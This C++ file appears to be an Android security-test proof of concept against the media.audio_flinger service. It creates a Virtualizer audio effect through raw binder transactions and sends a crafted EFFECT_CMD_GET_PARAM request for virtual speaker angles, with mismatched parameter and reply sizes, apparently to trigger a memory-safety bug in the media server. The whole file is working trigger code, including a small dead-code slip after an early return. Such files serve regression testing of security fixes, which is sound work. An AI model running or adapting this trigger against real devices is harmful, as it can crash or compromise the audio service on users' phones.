/**
 * Copyright (C) 2017 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include <audio_effects/effect_visualizer.h>
#include <binder/IServiceManager.h>
#include <hardware/audio_effect.h>
#include <media/AudioEffect.h>
#include <media/IAudioFlinger.h>
#include <media/IEffect.h>
#include <media/IEffectClient.h>

using namespace android;

struct EffectClient : public BnEffectClient {
  EffectClient() {}
  virtual void controlStatusChanged(bool controlGranted __unused) {}
  virtual void enableStatusChanged(bool enabled __unused) {}
  virtual void commandExecuted(uint32_t cmdCode __unused,
                               uint32_t cmdSize __unused,
                               void *pCmdData __unused,
                               uint32_t replySize __unused,
                               void *pReplyData __unused) {}
};

static sp<IBinder> createEffect(effect_descriptor_t *pDesc,
                                const sp<IEffectClient> &client,
                                int32_t priority, audio_io_handle_t output,
                                audio_session_t sessionId,
                                const String16 &opPackageName, status_t *status,
                                int *id, int *enabled) {
  sp<IServiceManager> sm = defaultServiceManager();
  sp<IBinder> binder = sm->getService(String16("media.audio_flinger"));

  if (binder.get() == NULL) {
    return NULL;
  }

  Parcel data, reply;
  sp<IBinder> effect;

  if (pDesc == NULL) {
    return effect;
    if (status != NULL) {
      *status = BAD_VALUE;
    }
  }

  data.writeInterfaceToken(String16("android.media.IAudioFlinger"));
  data.write(pDesc, sizeof(effect_descriptor_t));
  data.writeStrongBinder(IInterface::asBinder(client));
  data.writeInt32(priority);
  data.writeInt32((int32_t)output);
  data.writeInt32(sessionId);
  data.writeString16(opPackageName);

  status_t lStatus = binder->transact(40 /*CREATE_EFFECT*/, data, &reply);
  if (lStatus == NO_ERROR) {
    lStatus = reply.readInt32();
    int tmp = reply.readInt32();
    if (id != NULL) {
      *id = tmp;
    }
    tmp = reply.readInt32();
    if (enabled != NULL) {
      *enabled = tmp;
    }
    effect = reply.readStrongBinder();
    reply.read(pDesc, sizeof(effect_descriptor_t));
  }
  if (status != NULL) {
    *status = lStatus;
  }

  return effect;
}

static status_t command(sp<IBinder> binder, uint32_t cmdCode, uint32_t cmdSize,
                        void *pCmdData, uint32_t *pReplySize,
                        void *pReplyData) {
  Parcel data, reply;
  data.writeInterfaceToken(String16("android.media.IEffect"));
  data.writeInt32(cmdCode);
  int size = cmdSize;
  if (pCmdData == NULL) {
    size = 0;
  }
  data.writeInt32(size);
  if (size) {
    data.write(pCmdData, size);
  }
  if (pReplySize == NULL) {
    size = 0;
  } else {
    size = *pReplySize;
  }
  data.writeInt32(size);

  status_t status = binder->transact(3 /*COMMAND*/, data, &reply);
  if (status == NO_ERROR) {
    status = reply.readInt32();
  }
  if (status != NO_ERROR) {
    if (pReplySize != NULL) *pReplySize = 0;
    ALOGI("command status: %d", status);
    return status;
  }

  size = reply.readInt32();
  if (size != 0 && pReplyData != NULL && pReplySize != NULL) {
    reply.read(pReplyData, size);
    *pReplySize = size;
  }
  return status;
}

#define FIVEBAND_NUMBANDS 5
#define MAX_NUM_BANDS 5
#define MAX_CALL_SIZE 256
#define LVM_MAX_SESSIONS 32
#define LVM_UNUSED_SESSION INT_MAX
#define BASS_BOOST_CUP_LOAD_ARM9E 150   // Expressed in 0.1 MIPS
#define VIRTUALIZER_CUP_LOAD_ARM9E 120  // Expressed in 0.1 MIPS
#define EQUALIZER_CUP_LOAD_ARM9E 220    // Expressed in 0.1 MIPS
#define VOLUME_CUP_LOAD_ARM9E 0         // Expressed in 0.1 MIPS
#define BUNDLE_MEM_USAGE 25             // Expressed in kB
static effect_descriptor_t gVirtualizerDescriptor = {
    {0x37cc2c00, 0xdddd, 0x11db, 0x8577, {0x00, 0x02, 0xa5, 0xd5, 0xc5, 0x1b}},
    {0x1d4033c0, 0x8557, 0x11df, 0x9f2d, {0x00, 0x02, 0xa5, 0xd5, 0xc5, 0x1b}},
    EFFECT_CONTROL_API_VERSION,
    (EFFECT_FLAG_TYPE_INSERT | EFFECT_FLAG_INSERT_LAST |
     EFFECT_FLAG_DEVICE_IND | EFFECT_FLAG_VOLUME_CTRL),
    VIRTUALIZER_CUP_LOAD_ARM9E,
    BUNDLE_MEM_USAGE,
    "Virtualizer",
    "NXP Software Ltd.",
};

int main() {
  sp<EffectClient> effectClient(new EffectClient());

  const int32_t priority = 0;
  audio_session_t sessionId = AUDIO_SESSION_OUTPUT_MIX;
  const audio_io_handle_t io = AUDIO_IO_HANDLE_NONE;
  const String16 opPackageName("com.exp.poc");
  int32_t id;
  int enabled;
  status_t err;

  sp<IBinder> effect =
      createEffect(&gVirtualizerDescriptor, effectClient, priority, io,
                   sessionId, opPackageName, &err, &id, &enabled);
  if (effect == NULL || err != NO_ERROR) {
    return 0;
  }

  uint32_t cmdCode, cmdSize, replySize;
  void *pCmdData, *pReplyData;

  effect_param_t *param;
  param =
      (effect_param_t *)malloc(sizeof(effect_param_t) + sizeof(uint32_t) * 3);
  param->psize = sizeof(uint32_t) * 3;
  param->vsize = 12;
  *((uint32_t *)param->data) = 2;  // VIRTUALIZER_PARAM_VIRTUAL_SPEAKER_ANGLES
  *((uint32_t *)param->data + 1) = 1;  // nbChannels
  *((uint32_t *)param->data + 2) = 4;  // deviceType

  cmdCode = EFFECT_CMD_GET_PARAM;
  cmdSize = sizeof(effect_param_t) + sizeof(uint32_t) * 3;
  pCmdData = param;
  replySize = sizeof(effect_param_t) + sizeof(uint32_t) * 3;
  pReplyData = malloc(0x100);

  command(effect, cmdCode, cmdSize, pCmdData, &replySize, pReplyData);
  return 0;
}
